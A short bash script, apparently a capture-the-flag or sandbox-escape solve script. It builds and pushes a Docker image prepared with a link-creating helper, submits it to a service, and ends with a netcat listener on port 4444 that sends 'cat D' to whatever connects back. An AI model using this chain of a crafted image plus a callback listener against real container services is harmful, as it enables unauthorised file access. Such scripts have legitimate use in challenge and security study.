#!/bin/bash
mkdir rootfs
python3 ./create_links.py  # this is long, comment if not done
docker build -t registry.gitlab.com/mytempaccount123/test .
docker push registry.gitlab.com/mytempaccount123/test
python3 ./submit_image.py
echo 'cat D' | nc -l -vvv -p 4444
